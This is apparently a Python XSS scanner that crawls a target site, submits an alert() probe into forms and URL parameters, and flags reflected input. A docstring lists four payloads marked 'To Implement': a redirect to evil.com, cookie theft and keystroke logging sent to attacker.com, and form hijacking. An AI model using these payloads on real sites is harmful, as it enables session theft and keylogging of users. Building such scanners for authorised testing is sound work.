import requests
from collections import deque
import re
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from termcolor import colored
"""
To Implement
1. Redirection - <script>window.location.href="https://evil.com"</script>
2. Cookie Theft - <script>new Image().src="https://attacker.com/cookie.php?cookie="+document.cookie</script>
3. Keystroke Logging - <script>document.onkeypress = function(e) { new Image().src = "https://attacker.com/keylog.php?k=" + e.keyCode; }</script>
4. Form Hijacking - <script>document.forms[0].onsubmit = function() {document.forms[0].elements[0].value="hacked";}</script>
"""
class Scanner:
    def __init__(self, url, ignore):
        # maintain login
        self.session = requests.Session()
        self.target = url
        self.ignore_list = ignore
        self.target_links = []
        self.visited = set()

    def extract_hrefs(self, url):
        response = self.session.get(url)
        if not response:
            return None
        response = response.content
        try:
            href_links = re.findall('(?:href=")(.*?)"', response.decode('utf-8'))
            return href_links
        except:
            return []

    def crawl_by_hrefs(self, url=None):
        if url == None:
            url = self.target
        queue = deque([url])
        # BREADTH-FIRST SEARCH 
        while queue:
            node = queue.popleft()
            if node in self.ignore_list:
                continue
            refs = self.extract_hrefs(node)
            if not refs:
                continue
            for link in refs:
                link = urljoin(url, link)
                if link not in self.visited:
                    self.visited.add(link)
                    if url not in link:
                        # print("[-] External Link ->", link)
                        continue
                    queue.append(link)
                    self.target_links.append(link)

        print(colored("[+] Finished Crawling","green"))

    def extract_forms(self, url):
        response = self.session.get(url)
        # BS allows for the extraction of HTML elements and tags from the pages
        parsed_html = BeautifulSoup(response.content,
                                    features="html.parser")
        # to get elements from parser HTML 
        return parsed_html.findAll("form")

    def submit_form(self, form, value, url):

        # to get attributes from elements
        action = form.get("action")
        post_url = urljoin(url,action)
        method = form.get("method")

        data_dict = {}
        # find input elements
        inputs_list = form.findAll("input")
        for input in inputs_list:
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value") # default set to button placeholder
            if input_type == "text":
                input_value = value
            data_dict[input_name] = input_value
        
        if method == "post":
            return self.session.post(post_url, 
                                     data=data_dict)
        
        return self.session.get(post_url, 
                                params=data_dict)
    
    def run_scanner(self):
        self.crawl_by_hrefs()
        for link in self.target_links:
            forms = self.extract_forms(link)
            for form in forms:
                print("[+] Testing form in "+ link)
                vuln = self.test_xss_form(form, link)
                if vuln:
                    out = "[**] Vulnerable Form in link -> "+link
                    print(colored(out,"yellow"))
                    print(colored(form,"red"))
            if '=' in link:
                print("[+] Testing " + link)
                vuln = self.test_xss_url(link)
                if vuln:
                    print(colored("[**] Link is vulnerable","red"))

    def test_xss_url(self, url):
        xss_payload = "<sCript>alert('XSS test')</scRipt>"
        url = url.replace("=","="+xss_payload)
        response = self.session.get(url)
        return xss_payload in response.content.decode('utf-8')

    def test_xss_form(self, form, url):
        xss_payload = "<sCript>alert('XSS test')</scRipt>"
        response = self.submit_form(form, 
                                    xss_payload, 
                                    url)
        return xss_payload in response.content.decode('utf-8')
